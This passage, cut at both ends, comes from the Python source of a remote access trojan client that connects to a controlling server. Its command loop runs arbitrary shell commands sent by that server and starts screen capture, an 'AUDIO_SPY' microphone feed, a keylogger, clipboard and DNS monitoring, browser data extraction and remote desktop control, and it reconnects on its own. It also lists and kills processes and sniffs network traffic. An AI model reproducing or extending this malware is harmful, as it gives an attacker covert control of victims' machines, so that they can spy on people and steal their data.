                    raise RuntimeError("Socket connection broken")
                
                print(f"[*] Sent chunk of {bytes_sent} bytes, total sent: {total_sent}/{len(json_data)}")
            
            print("[*] Process list sent successfully")
            
        except Exception as e:
            error_msg = f"Error getting process list: {str(e)}"
            print(f"[!] {error_msg}")
            self.send_error(error_msg)
    
    def send_process_details(self, pid):
        """Send detailed information about a specific process"""
        try:
            # Check if process exists
            if not psutil.pid_exists(pid):
                self.send_error(f"Process with PID {pid} not found")
                return
            
            # Get process info
            proc = psutil.Process(pid)
            
            try:
                # Get basic process info
                process_info = {
                    'pid': proc.pid,
                    'name': proc.name(),
                    'exe': proc.exe() if hasattr(proc, 'exe') else 'Unknown',
                    'username': proc.username() if hasattr(proc, 'username') else 'Unknown',
                    'status': proc.status() if hasattr(proc, 'status') else 'Unknown',
                    'cpu_percent': proc.cpu_percent(interval=0.5),
                    'memory': proc.memory_info().rss if hasattr(proc, 'memory_info') else 0,
                    'threads': proc.num_threads() if hasattr(proc, 'num_threads') else 0,
                    'create_time': datetime.fromtimestamp(proc.create_time()).strftime('%Y-%m-%d %H:%M:%S') if hasattr(proc, 'create_time') else 'Unknown'
                }
                
                # Get command line
                try:
                    cmdline = ' '.join(proc.cmdline()) if hasattr(proc, 'cmdline') else 'Unknown'
                    process_info['cmdline'] = cmdline
                except (psutil.AccessDenied, psutil.ZombieProcess):
                    process_info['cmdline'] = 'Access Denied'
                
                # Get network connections
                try:
                    if hasattr(proc, 'connections'):
                        connections = []
                        for conn in proc.connections():
                            if conn.laddr and len(conn.laddr) >= 2:
                                local = f"{conn.laddr[0]}:{conn.laddr[1]}"
                                if conn.raddr and len(conn.raddr) >= 2:
                                    remote = f"{conn.raddr[0]}:{conn.raddr[1]}"
                                    connections.append(f"{local} -> {remote} ({conn.status})")
                                else:
                                    connections.append(f"{local} ({conn.status})")
                        process_info['connections'] = connections
                except (psutil.AccessDenied, psutil.ZombieProcess):
                    process_info['connections'] = ['Access Denied']
                
                # Get open files
                try:
                    if hasattr(proc, 'open_files'):
                        open_files = [f.path for f in proc.open_files()]
                        process_info['open_files'] = open_files
                except (psutil.AccessDenied, psutil.ZombieProcess):
                    process_info['open_files'] = ['Access Denied']
                
                # Convert to JSON and send
                json_data = json.dumps(process_info).encode('utf-8')
                
                # Send size first
                self.client_socket.send(struct.pack('Q', len(json_data)))
                
                # Send the process data in chunks
                total_sent = 0
                while total_sent < len(json_data):
                    chunk = json_data[total_sent:total_sent + self.buffer_size]
                    self.client_socket.send(chunk)
                    total_sent += len(chunk)
                
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
                self.send_error(f"Error accessing process {pid}: {str(e)}")
        
        except Exception as e:
            self.send_error(f"Error getting process details: {str(e)}")
    
    def kill_process(self, pid):
        """Terminate a process with the given PID"""
        try:
            # Check if process exists
            if not psutil.pid_exists(pid):
                self.client_socket.send(f"ERROR: Process with PID {pid} not found".encode())
                return
            
            # Try to terminate the process
            proc = psutil.Process(pid)
            proc_name = proc.name()
            
            # Terminate process
            proc.terminate()
            
            # Wait briefly for the process to terminate
            gone, still_alive = psutil.wait_procs([proc], timeout=3)
            
            # If still alive, try to kill it
            if still_alive:
                proc.kill()
                gone, still_alive = psutil.wait_procs([proc], timeout=3)
            
            if still_alive:
                self.client_socket.send(f"ERROR: Could not terminate process {pid} ({proc_name})".encode())
            else:
                self.client_socket.send(f"SUCCESS: Process {pid} ({proc_name}) terminated".encode())
        
        except psutil.AccessDenied:
            self.client_socket.send(f"ERROR: Access denied when terminating process {pid}".encode())
        except psutil.NoSuchProcess:
            self.client_socket.send(f"ERROR: Process with PID {pid} not found".encode())
        except Exception as e:
            self.client_socket.send(f"ERROR: {str(e)}".encode())
    
    def send_error(self, error_msg):
        """Send an error message back to the server"""
        try:
            error_data = f"ERROR: {error_msg}".encode('utf-8')
            self.client_socket.send(struct.pack('Q', len(error_data)))
            self.client_socket.send(error_data)
        except:
            pass
        


class NetworkAnalyzer:
    """Class for real-time analysis of network traffic"""
    
    def __init__(self):
        self.active = False
        self.analysis_thread = None
        
        # Initialize data structures
        self.start_time = time.time()
        self.total_packets = 0
        self.total_bytes = 0
        self.protocols = {}  # Protocol counter
        self.connections = {}  # Connection tracking
        
        # For bandwidth calculation
        self.last_update_time = time.time()
        self.bytes_since_last = 0
        self.packets_since_last = 0
    
    def start(self):
        """Start network traffic analysis"""
        try:
            self.active = True
            self.analysis_thread = threading.Thread(target=self._analyze_traffic)
            self.analysis_thread.daemon = True
            self.analysis_thread.start()
            return True
        except Exception as e:
            print(f"[!] Error starting network analysis: {e}")
            return False
    
    def stop(self):
        """Stop network traffic analysis"""
        self.active = False
        if self.analysis_thread:
            self.analysis_thread.join(timeout=1.0)
    
    def _analyze_traffic(self):
        """Thread function to capture and analyze network traffic"""
        try:
            from scapy.all import sniff
            
            # Define packet handler
            def packet_handler(packet):
                if not self.active:
                    return
                
                try:
                    # Increment total packet count
                    self.total_packets += 1
                    self.packets_since_last += 1
                    
                    # Get packet size
                    packet_size = len(packet)
                    self.total_bytes += packet_size
                    self.bytes_since_last += packet_size
                    
                    # Analyze protocols
                    protocol = self._get_packet_protocol(packet)
                    if protocol:
                        self.protocols[protocol] = self.protocols.get(protocol, 0) + 1
                    
                    # Track connections
                    connection_key = self._get_connection_key(packet)
                    if connection_key:
                        if connection_key not in self.connections:
                            self.connections[connection_key] = {
                                'bytes': 0,
                                'packets': 0,
                                'first_seen': time.time(),
                                'last_seen': time.time()
                            }
                        
                        self.connections[connection_key]['bytes'] += packet_size
                        self.connections[connection_key]['packets'] += 1
                        self.connections[connection_key]['last_seen'] = time.time()
                    
                except Exception as e:
                    print(f"[!] Error processing packet: {e}")
            
            # Start sniffing
            sniff(prn=packet_handler, store=False)
        
        except Exception as e:
            print(f"[!] Error in network analysis thread: {e}")
            self.active = False
    
    def _get_packet_protocol(self, packet):
            """Determine the protocol of a packet"""
            # from scapy.all import IP, TCP, UDP, ICMP, ARP
            
            if ARP in packet:
                return "ARP"
            if IP in packet:
                if TCP in packet:
                    # Check for application layer protocols
                    if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                        return "HTTP"
                    elif packet[TCP].dport == 443 or packet[TCP].sport == 443:
                        return "HTTPS"
                    elif packet[TCP].dport == 22 or packet[TCP].sport == 22:
                        return "SSH"
                    elif packet[TCP].dport == 21 or packet[TCP].sport == 21:
                        return "FTP"
                    elif packet[TCP].dport == 25 or packet[TCP].sport == 25:
                        return "SMTP"
                    elif packet[TCP].dport == 53 or packet[TCP].sport == 53:
                        return "DNS-TCP"
                    else:
                        return "TCP"
                elif UDP in packet:
                    if packet[UDP].dport == 53 or packet[UDP].sport == 53:
                        return "DNS"
                    elif packet[UDP].dport == 67 or packet[UDP].sport == 67 or \
                        packet[UDP].dport == 68 or packet[UDP].sport == 68:
                        return "DHCP"
                    else:
                        return "UDP"
                elif ICMP in packet:
                    return "ICMP"
                else:
                    return "IP"
            
            # Default case
            return "Other"
    
    def _get_connection_key(self, packet):
        """Generate a unique key for tracking connections"""
        # from scapy.all import IP, TCP, UDP
        
        try:
            if IP in packet:
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                
                if TCP in packet:
                    protocol = "TCP"
                    sport = str(packet[TCP].sport)
                    dport = str(packet[TCP].dport)
                    
                    # Normalize connection direction (client->server)
                    if int(sport) > int(dport):
                        return f"{dst_ip}|{src_ip}|{protocol}|{dport}"
                    else:
                        return f"{src_ip}|{dst_ip}|{protocol}|{dport}"
                        
                elif UDP in packet:
                    protocol = "UDP"
                    sport = str(packet[UDP].sport)
                    dport = str(packet[UDP].dport)
                    
                    # Normalize connection direction
                    if int(sport) > int(dport):
                        return f"{dst_ip}|{src_ip}|{protocol}|{dport}"
                    else:
                        return f"{src_ip}|{dst_ip}|{protocol}|{dport}"
                else:
                    # Other IP-based protocol
                    protocol = str(packet[IP].proto)
                    return f"{src_ip}|{dst_ip}|{protocol}|0"
        except Exception as e:
            print(f"[!] Error generating connection key: {e}")
        
        return None
    
    def get_analysis_data(self):
        """Get the current analysis data"""
        # Calculate time difference since last update
        current_time = time.time()
        time_diff = max(0.001, current_time - self.last_update_time)  # Avoid division by zero
        
        # Prepare data to send
        analysis_data = {
            'total_packets': self.total_packets,
            'total_bytes': self.total_bytes,
            'protocols': self.protocols,
            'connections': self.connections,
            'bytes_since_last': self.bytes_since_last,
            'packets_since_last': self.packets_since_last,
            'time_diff': time_diff
        }
        
        # Reset counters for next update
        self.bytes_since_last = 0
        self.packets_since_last = 0
        self.last_update_time = current_time
        
        return analysis_data
    
    def identify_anomalies(self):
        """Identify potential anomalous network behavior"""
        anomalies = []
        
        # Check for unusually high traffic from a single connection
        if self.connections:
            avg_bytes = sum(conn['bytes'] for conn in self.connections.values()) / len(self.connections)
            threshold = avg_bytes * 5  # 5x average is suspicious
            
            for conn_key, conn_data in self.connections.items():
                if conn_data['bytes'] > threshold:
                    parts = conn_key.split('|')
                    if len(parts) >= 4:
                        source, destination, protocol, port = parts
                        anomalies.append({
                            'type': 'high_traffic',
                            'connection': conn_key,
                            'source': source,
                            'destination': destination,
                            'protocol': protocol,
                            'port': port,
                            'bytes': conn_data['bytes'],
                            'threshold': threshold
                        })
        
        # Check for port scanning (many connections with few packets each)
        port_scan_candidates = {}
        for conn_key, conn_data in self.connections.items():
            parts = conn_key.split('|')
            if len(parts) >= 4:
                source, destination, protocol, port = parts
                
                if protocol == "TCP" and conn_data['packets'] < 5:
                    key = f"{source}|{destination}"
                    if key not in port_scan_candidates:
                        port_scan_candidates[key] = []
                    port_scan_candidates[key].append(int(port))
        
        for key, ports in port_scan_candidates.items():
            if len(ports) > 10:  # Threshold for port scan detection
                source, destination = key.split('|')
                anomalies.append({
                    'type': 'port_scan',
                    'source': source,
                    'destination': destination,
                    'port_count': len(ports),
                    'ports': ports[:20]  # First 20 ports for context
                })
        
        return anomalies

    def get_frequent_connections(self, limit=10):
        """Get the most frequently accessed destinations"""
        destination_counts = {}
        
        for conn_key, conn_data in self.connections.items():
            parts = conn_key.split('|')
            if len(parts) >= 4:
                destination = parts[1]  # Destination IP
                
                if destination not in destination_counts:
                    destination_counts[destination] = {
                        'packets': 0,
                        'bytes': 0,
                        'connections': 0
                    }
                
                destination_counts[destination]['packets'] += conn_data['packets']
                destination_counts[destination]['bytes'] += conn_data['bytes']
                destination_counts[destination]['connections'] += 1
        
        # Sort by bytes and return top results
        sorted_destinations = sorted(
            destination_counts.items(),
            key=lambda x: x[1]['bytes'],
            reverse=True
        )
        
        return sorted_destinations[:limit]

    def detect_dns_tunneling(self):
        """Check for signs of DNS tunneling (data exfiltration over DNS)"""
        dns_traffic = []
        
        for conn_key, conn_data in self.connections.items():
            parts = conn_key.split('|')
            if len(parts) >= 4:
                protocol, port = parts[2], parts[3]
                
                if (protocol == "UDP" and port == "53") or (protocol == "TCP" and port == "53"):
                    # This is DNS traffic
                    dns_traffic.append((conn_key, conn_data))
        
        # Analyze DNS traffic patterns
        if dns_traffic:
            # Compute average DNS request size
            total_bytes = sum(data[1]['bytes'] for data in dns_traffic)
            total_packets = sum(data[1]['packets'] for data in dns_traffic)
            avg_size = total_bytes / total_packets if total_packets > 0 else 0
            
            # Check if average size is suspicious (DNS tunneling often has larger than normal packets)
            if avg_size > 100:  # Typical DNS queries are small
                return {
                    'suspicious': True,
                    'avg_size': avg_size,
                    'total_dns_traffic': total_bytes,
                    'dns_connections': len(dns_traffic)
                }
        
        return {'suspicious': False}
    

class EnhancedAdaptiveScreenCapture:
    """Handles advanced adaptive quality and performance for screen captures"""
    
    def __init__(self, client_socket, initial_quality=60):
        self.client_socket = client_socket
        self.quality = initial_quality
        self.min_quality = 15
        self.max_quality = 85
        
        # Adaptive bitrate control with multi-level targets
        self.bitrate_targets = {
            'low': 2000000,    # 2 Mbps for slow networks
            'medium': 5000000, # 5 Mbps for average networks
            'high': 10000000   # 10 Mbps for fast networks
        }
        self.current_target = 'medium'
        self.target_bitrate = self.bitrate_targets[self.current_target]
        
        # Enhanced metrics tracking with exponential moving averages
        self.alpha_short = 0.3  # Short-term trend weight
        self.alpha_long = 0.05  # Long-term trend weight
        
        # Performance metrics with smoothing
        self.avg_bitrate_short = 0
        self.avg_bitrate_long = 0
        self.avg_send_time_short = 0
        self.avg_send_time_long = 0
        self.avg_fps = 0
        
        # Resolution adaptation
        self.resolution_scale = 1.0  # Full resolution
        self.min_scale = 0.5
        self.max_scale = 1.0
        
        # Advanced control parameters
        self.network_stability = 1.0  # Measure of network stability (1.0 = stable)
        self.quality_change_threshold = 3  # Minimum quality change to apply
        self.adjustment_cooldown = 0
        self.cooldown_period = 2  # Wait 2 frames before next adjustment
        
        # Performance history with timestamps for time-weighted analysis
        self.performance_history = collections.deque(maxlen=20)  # Longer history
        
        # Network congestion detection
        self.congestion_indicators = 0  # Counter for consecutive congestion signs
        self.congestion_threshold = 3  # Threshold for triggering congestion response
        
        # Resource monitoring
        self.cpu_usage_history = collections.deque(maxlen=10)
        self.start_time = time.time()
        self.total_bytes_sent = 0
        self.frame_count = 0
        
        # Initialize time-series for advanced prediction
        self.time_series = {
            'bitrate': collections.deque(maxlen=30),
            'send_time': collections.deque(maxlen=30),
            'quality': collections.deque(maxlen=30),
            'timestamp': collections.deque(maxlen=30)
        }
    
    def measure_performance(self, data_size, send_time):
        """Enhanced performance measurement with predictive analytics"""
        self.frame_count += 1
        self.total_bytes_sent += data_size
        
        if send_time <= 0:
            return
            
        # Calculate current metrics
        current_bitrate = (data_size * 8) / send_time
        current_timestamp = time.time()
        
        # Update CPU usage history (platform dependent)
        try:
            cpu_usage = psutil.cpu_percent(interval=None)
            self.cpu_usage_history.append(cpu_usage)
        except:
            # Fallback if psutil not available
            self.cpu_usage_history.append(0)
        
        # Store in detailed history for time-series analysis
        self.performance_history.append({
            'data_size': data_size,
            'send_time': send_time,
            'bitrate': current_bitrate,
            'quality': self.quality,
            'timestamp': current_timestamp,
            'resolution_scale': self.resolution_scale
        })
        
        # Update time series for prediction
        self.time_series['bitrate'].append(current_bitrate)
        self.time_series['send_time'].append(send_time)
        self.time_series['quality'].append(self.quality)
        self.time_series['timestamp'].append(current_timestamp)
        
        # Update exponential moving averages
        if self.avg_bitrate_short == 0:
            # First measurement
            self.avg_bitrate_short = current_bitrate
            self.avg_bitrate_long = current_bitrate
            self.avg_send_time_short = send_time
            self.avg_send_time_long = send_time
        else:
            # Update with exponential weighting
            self.avg_bitrate_short = (1 - self.alpha_short) * self.avg_bitrate_short + self.alpha_short * current_bitrate
            self.avg_bitrate_long = (1 - self.alpha_long) * self.avg_bitrate_long + self.alpha_long * current_bitrate
            self.avg_send_time_short = (1 - self.alpha_short) * self.avg_send_time_short + self.alpha_short * send_time
            self.avg_send_time_long = (1 - self.alpha_long) * self.avg_send_time_long + self.alpha_long * send_time
        
        # Calculate FPS
        if len(self.time_series['timestamp']) >= 2:
            time_diff = self.time_series['timestamp'][-1] - self.time_series['timestamp'][0]
            if time_diff > 0:
                current_fps = len(self.time_series['timestamp']) / time_diff
                if self.avg_fps == 0:
                    self.avg_fps = current_fps
                else:
                    self.avg_fps = 0.8 * self.avg_fps + 0.2 * current_fps
        
        # Calculate network stability index
        if len(self.time_series['bitrate']) >= 5:
            recent_bitrates = list(self.time_series['bitrate'])[-5:]
            if max(recent_bitrates) > 0:
                stability = min(recent_bitrates) / max(recent_bitrates)
                self.network_stability = 0.7 * self.network_stability + 0.3 * stability
        
        # Only adjust after collecting enough data and if not on cooldown
        if len(self.performance_history) >= 5 and self.adjustment_cooldown <= 0:
            self._adjust_parameters()
        else:
            self.adjustment_cooldown = max(0, self.adjustment_cooldown - 1)
    
    def _adjust_parameters(self):
        """Advanced parameter adjustment using predictive analytics"""
        # Calculate target performance based on current conditions
        target_achieved = self._evaluate_target_achievement()
        network_trend = self._analyze_network_trend()
        
        # Determine adjustment strategy
        if target_achieved == "exceeding" and self.network_stability > 0.8:
            # Network is stable and performance exceeds targets - try increasing quality
            self._increase_quality()
        elif target_achieved == "below" or network_trend == "deteriorating":
            # Performance below target or network deteriorating
            self._decrease_quality_or_resolution()
        elif target_achieved == "on_target" and network_trend == "improving":
            # On target with improving network - small quality increase
            self._slight_increase_quality()
        
        # Detect and respond to congestion
        if self._detect_congestion():
            self._handle_congestion()
        
        # Apply cooldown
        self.adjustment_cooldown = self.cooldown_period
        
        # Adapt target bitrate based on sustained performance
        self._adapt_bitrate_target()
        
        # Log current status periodically
        if self.frame_count % 30 == 0:
            self._log_status()
    
    def _evaluate_target_achievement(self):
        """Evaluate if we're meeting our target performance"""
        # Calculate ratio of current performance to target
        bitrate_ratio = self.avg_bitrate_short / self.target_bitrate
        
        if bitrate_ratio > 1.2 and self.avg_send_time_short < 0.05:
            return "exceeding"
        elif bitrate_ratio < 0.8 or self.avg_send_time_short > 0.1:
            return "below"
        else:
            return "on_target"
    
    def _analyze_network_trend(self):
        """Analyze recent network performance trend"""
        if len(self.time_series['bitrate']) < 10:
            return "stable"
            
        # Get recent values
        recent_bitrates = list(self.time_series['bitrate'])[-10:]
        first_half = sum(recent_bitrates[:5]) / 5
        second_half = sum(recent_bitrates[5:]) / 5
        
        # Calculate trend direction and magnitude
        if second_half < 0.8 * first_half:
            return "deteriorating"
        elif second_half > 1.2 * first_half:
            return "improving"
        else:
            return "stable"
    
    def _increase_quality(self):
        """Intelligently increase quality"""
        # Determine appropriate increment based on stability
        increment = max(2, int(5 * self.network_stability))
        
        # If we're capping at max quality, try increasing resolution instead
        if self.quality >= self.max_quality - 5:
            if self.resolution_scale < self.max_scale:
                self.resolution_scale = min(self.max_scale, self.resolution_scale + 0.1)
                return
                
        # Otherwise increase quality
        new_quality = min(self.max_quality, self.quality + increment)
        
        # Only apply if the change is significant
        if new_quality - self.quality >= self.quality_change_threshold:
            self.quality = new_quality
    
    def _decrease_quality_or_resolution(self):
        """Intelligently decrease quality or resolution based on conditions"""
        # Check send time to determine severity
        if self.avg_send_time_short > 0.2:
            # Severe performance issue - aggressive adjustment
            if self.resolution_scale > self.min_scale:
                # Reduce resolution first in severe cases
                self.resolution_scale = max(self.min_scale, self.resolution_scale - 0.1)
            else:
                # Then reduce quality significantly
                self.quality = max(self.min_quality, self.quality - 10)
        else:
            # Moderate performance issue - gentle adjustment
            self.quality = max(self.min_quality, self.quality - 5)
    
    def _slight_increase_quality(self):
        """Make a small improvement to quality"""
        new_quality = min(self.max_quality, self.quality + 2)
        if new_quality - self.quality >= self.quality_change_threshold:
            self.quality = new_quality
    
    def _detect_congestion(self):
        """Detect network congestion using multiple indicators"""
        if len(self.time_series['send_time']) < 5:
            return False
            
        # Get recent values
        recent_send_times = list(self.time_series['send_time'])[-5:]
        
        # Check for increasing trend in send times
        increasing_trend = all(recent_send_times[i] < recent_send_times[i+1] for i in range(len(recent_send_times)-1))
        
        # Check for high variance
        avg_time = sum(recent_send_times) / len(recent_send_times)
        variance = sum((t - avg_time) ** 2 for t in recent_send_times) / len(recent_send_times)
        high_variance = variance > (avg_time * 0.3) ** 2
        
        # Detect congestion signs
        congestion_detected = (increasing_trend and recent_send_times[-1] > 1.5 * recent_send_times[0]) or high_variance
        
        if congestion_detected:
            self.congestion_indicators += 1
        else:
            self.congestion_indicators = max(0, self.congestion_indicators - 1)
        
        return self.congestion_indicators >= self.congestion_threshold
    
    def _handle_congestion(self):
        """Handle detected network congestion"""
        # Immediate quality reduction
        self.quality = max(self.min_quality, self.quality - 15)
        
        # Reduce resolution if quality is already low
        if self.quality < 30 and self.resolution_scale > self.min_scale:
            self.resolution_scale = max(self.min_scale, self.resolution_scale - 0.2)
        
        # Switch to lower bitrate target
        self.current_target = 'low'
        self.target_bitrate = self.bitrate_targets[self.current_target]
        
        # Reset congestion counter
        self.congestion_indicators = 0
        
        # Extended cooldown after congestion
        self.adjustment_cooldown = self.cooldown_period * 2
    
    def _adapt_bitrate_target(self):
        """Dynamically adapt bitrate target based on sustained performance"""
        # Only adapt after substantial history
        if len(self.performance_history) < 15:
            return
            
        # Calculate average sustained bitrate
        sustained_bitrate = self.avg_bitrate_long
        
        # Adjust target category based on sustained performance
        if self.current_target == 'low' and sustained_bitrate > self.bitrate_targets['low'] * 1.5:
            self.current_target = 'medium'
            self.target_bitrate = self.bitrate_targets['medium']
        elif self.current_target == 'medium':
            if sustained_bitrate > self.bitrate_targets['medium'] * 1.5:
                self.current_target = 'high'
                self.target_bitrate = self.bitrate_targets['high']
            elif sustained_bitrate < self.bitrate_targets['low'] * 0.8:
                self.current_target = 'low'
                self.target_bitrate = self.bitrate_targets['low']
        elif self.current_target == 'high' and sustained_bitrate < self.bitrate_targets['medium'] * 0.8:
            self.current_target = 'medium'
            self.target_bitrate = self.bitrate_targets['medium']
    
    def _log_status(self):
        """Log detailed status information"""
        # Calculate overall statistics
        elapsed_time = time.time() - self.start_time
        avg_bitrate = (self.total_bytes_sent * 8) / elapsed_time if elapsed_time > 0 else 0
        
        status = f"Quality: {self.quality}, Scale: {self.resolution_scale:.2f}, "
        status += f"Target: {self.current_target} ({self.target_bitrate/1000000:.1f}Mbps), "
        status += f"Avg: {self.avg_bitrate_short/1000000:.2f}Mbps, "
        status += f"FPS: {self.avg_fps:.1f}, "
        status += f"Stability: {self.network_stability:.2f}"
        
        print(f"[*] Metrics: {status}")

class RATClient:
    def __init__(self, server_ip=SERVER_IP, server_port=SERVER_PORT):
        self.server_ip = server_ip
        self.server_port = server_port
        self.server_address = (self.server_ip, self.server_port)
        self.client_socket = None
        self.connected = False
        self.stop_threads = False
        
        # Flags for various features
        self.screen_capture_active = False
        self.audio_spy_active = False
        self.keylogger_active = False
        
        # Thread trackers
        self.active_threads = []
        
        # Initialize keyboard listener but don't start it yet
        self.key_listener = None
        self.keys_recorded = []
        
        # File transfer handler (will be initialized after connection)
        self.file_handler = None
        self.process_manager = None
        
        self.advanced_monitoring = None
        
    def connect(self):
        """Establish connection to the server"""
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect(self.server_address)
            self.connected = True
            print(f"[*] Connected to {self.server_ip}:{self.server_port}")
            
            # Initialize file handler
            self.file_handler = ClientFileHandler(self.client_socket, buffer_size=BUFFER_SIZE)
            self.process_manager = ClientProcessManager(self.client_socket, buffer_size=BUFFER_SIZE)
            self.advanced_monitoring = AdvancedMonitoring(self.client_socket, buffer_size=BUFFER_SIZE)
            # Start the main command handler thread
            self.command_thread = threading.Thread(target=self.handle_commands)
            self.command_thread.daemon = True
            self.command_thread.start()
            self.active_threads.append(self.command_thread)
            
            return True
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return False
    
    def reconnect(self):
        """Attempt to reconnect to the server"""
        while not self.connected and not self.stop_threads:
            print("[*] Attempting to reconnect...")
            try:
                self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client_socket.connect(self.server_address)
                self.connected = True
                print(f"[*] Reconnected to {self.server_ip}:{self.server_port}")
                
                # Reinitialize file handler
                self.file_handler = ClientFileHandler(self.client_socket, buffer_size=BUFFER_SIZE)
                self.process_manager = ClientProcessManager(self.client_socket, buffer_size=BUFFER_SIZE)
                # Restart command handler
                self.command_thread = threading.Thread(target=self.handle_commands)
                self.command_thread.daemon = True
                self.command_thread.start()
                self.active_threads.append(self.command_thread)
                
                break
            except Exception as e:
                print(f"[!] Reconnection failed: {e}")
                time.sleep(5)  # Wait before next attempt
    
    def disconnect(self):
        """Disconnect from the server and cleanup resources"""
        self.stop_threads = True
        self.connected = False
        
        # Stop all active features
        self.screen_capture_active = False
        self.audio_spy_active = False
        self.stop_keylogger()
        
        # Close socket
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
            self.client_socket = None
        
        print("[*] Disconnected from server")
    
    def handle_commands(self):
        """Main loop for handling server commands"""
        while self.connected and not self.stop_threads:
            try:
                # Wait for commands from the server
                data = self.client_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
                print(data)
                if not data:
                    # Connection lost
                    print("[!] Connection to server lost")
                    self.connected = False
                    self.reconnect()
                    break
                
                # Process different command types
                if data == 'GETHOSTNAME':
                    self.send_hostname()
                
                elif data.startswith('CMD_COMMAND_'):
                    # Execute shell command
                    command = data[12:]  # Remove prefix
                    self.execute_command(command)
                
                elif data == 'SCRSHOOT':
                    # Start screen capture
                    if not self.screen_capture_active:
                        self.screen_capture_active = True
                        screen_thread = threading.Thread(target=self.screen_capture)
                        screen_thread.daemon = True
                        screen_thread.start()
                        self.active_threads.append(screen_thread)
                
                elif data == 'STOP_SCRSHOOT':
                    # Stop screen capture
                    self.screen_capture_active = False
                
                elif data == 'AUDIO_SPY':
                    # Start audio spy
                    if not self.audio_spy_active:
                        self.audio_spy_active = True
                        audio_thread = threading.Thread(target=self.audio_spy)
                        audio_thread.daemon = True
                        audio_thread.start()
                        self.active_threads.append(audio_thread)
                
                elif data == 'CLOSE_AUDIO_SPY':
                    # Stop audio spy
                    self.audio_spy_active = False
                
                elif data == 'KEY_REC':
                    # Start keylogger
                    self.start_keylogger()
                
                elif data == 'STOP_KEY_REC':
                    # Stop keylogger
                    self.stop_keylogger()
                
                # File transfer commands
                elif data.startswith('FILE_'):
                    print(f"[*] Handling file command: {data[:20]}...")
                    if self.file_handler:
                        self.file_handler.handle_file_command(data)
                    else:
                        print("[!] File handler not initialized")
                
                # Process manager commands
                elif data == 'PROCESS_LIST' or data == b'PROCESS_LIST':
                    print('[*] Received PROCESS_LIST command')
                    if self.process_manager:
                        self.process_manager.handle_process_command(data)
                    else:
                        print("[!] Process manager not initialized")

                elif data.startswith('PROCESS_DETAILS|'):
                    print(f'[*] Received process details command: {data}')
                    if self.process_manager:
                        self.process_manager.handle_process_command(data)
                    else:
                        print("[!] Process manager not initialized")

                elif data.startswith('KILL_PROCESS|'):
                    print(f'[*] Received kill process command: {data}')
                    if self.process_manager:
                        self.process_manager.handle_process_command(data)
                    else:
                        print("[!] Process manager not initialized")
            
                elif data == 'START_NETWORK_CAPTURE' or data == 'STOP_NETWORK_CAPTURE' or \
                 data == 'GET_NETWORK_CAPTURE' or data == 'START_CLIPBOARD_MONITORING' or \
                 data == 'STOP_CLIPBOARD_MONITORING' or data == 'GET_CLIPBOARD_DATA' or \
                 data == 'EXTRACT_BROWSER_DATA' or data == 'START_DNS_MONITORING' or \
                 data == 'STOP_DNS_MONITORING' or data == 'GET_DNS_HISTORY' or \
                 data == 'GET_SYSTEM_INFO':
                    print(f'[*] Received advanced monitoring command: {data}')
                    if self.advanced_monitoring:
                        self.advanced_monitoring.handle_monitoring_command(data)
                    else:
                        print("[!] Advanced monitoring not initialized")
                        
                        
                elif data.startswith('START_REMOTE_DESKTOP'):
                    # Format: START_REMOTE_DESKTOP|port_number
                    parts = data.split('|')
                    if len(parts) >= 2:
                        try:
                            control_port = int(parts[1])
                            
                            # Initialize remote desktop control if not already
                            if not hasattr(self, 'remote_desktop'):
                                self.remote_desktop = RemoteDesktopControl(self.client_socket)
                            
                            # Get screen dimensions to send back to server
                            screen_width, screen_height = pyautogui.size()
                            
                            # Start the remote desktop control
                            success = self.remote_desktop.start(control_port)
                            
                            if success:
                                # Send success response with screen dimensions
                                response = f"REMOTE_DESKTOP_STARTED|{screen_width}x{screen_height}"
                                self.client_socket.send(response.encode())
                            else:
                                self.client_socket.send(b"REMOTE_DESKTOP_ERROR")
                                
                        except Exception as e:
                            print(f"[!] Error starting remote desktop: {e}")
                            self.client_socket.send(f"REMOTE_DESKTOP_ERROR|{str(e)}".encode())
                    else:
                        self.client_socket.send(b"REMOTE_DESKTOP_ERROR|Missing port number")
                
                elif data == 'STOP_REMOTE_DESKTOP':
                    if hasattr(self, 'remote_desktop'):
                        try:
                            self.remote_desktop.stop()
                            self.client_socket.send(b"REMOTE_DESKTOP_STOPPED")
                        except Exception as e:
                            print(f"[!] Error stopping remote desktop: {e}")
                            self.client_socket.send(f"REMOTE_DESKTOP_ERROR|{str(e)}".encode())
                    else:
                        self.client_socket.send(b"REMOTE_DESKTOP_NOT_ACTIVE")
                
                elif data == 'START_NETWORK_ANALYSIS' or data == 'STOP_NETWORK_ANALYSIS' or \
                 data == 'GET_NETWORK_ANALYSIS_DATA':
                    print(f'[*] Received network analysis command: {data}')
                    if hasattr(self, 'network_analyzer'):
                        self.handle_network_analysis_command(data)
                    else:
                        print("[!] Network analyzer not initialized")
                        self.network_analyzer = NetworkAnalyzer()
                        self.handle_network_analysis_command(data)
                        
            except Exception as e:
                print(f"[!] Error handling commands: {e}")
                self.connected = False
                self.reconnect()
                break
    
    def send_hostname(self):
        """Send hostname to the server"""
        try:
            hostname = socket.gethostname()
            self.client_socket.send(hostname.encode())
        except Exception as e:
            print(f"[!] Error sending hostname: {e}")
    
    def execute_command(self, command):
        """Execute a shell command and return the result"""
        try:
            # Determine the correct shell to use based on OS
            if os.name == 'nt':  # Windows
                shell = True
            else:  # Unix/Linux/Mac
                shell = False
            
            # Run the command and capture output
            result = subprocess.run(command, shell=shell, stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE, text=True, timeout=10)
            
            # Combine stdout and stderr
            output = result.stdout + result.stderr
            
            if not output:
                output = "Command executed successfully (no output)"
            
            # Send back the size first (as expected by the server)
            output_bytes = output.encode('utf-8', errors='ignore')
            size = struct.pack('Q', len(output_bytes))
            self.client_socket.send(size)
            
            # Then send the actual output
            self.client_socket.sendall(output_bytes)
            
        except subprocess.TimeoutExpired:
            error_msg = "Command timed out after 10 seconds"
            size = struct.pack('Q', len(error_msg.encode()))
            self.client_socket.send(size)
            self.client_socket.send(error_msg.encode())
        
        except Exception as e:
            error_msg = f"Error executing command: {e}"
            size = struct.pack('Q', len(error_msg.encode()))
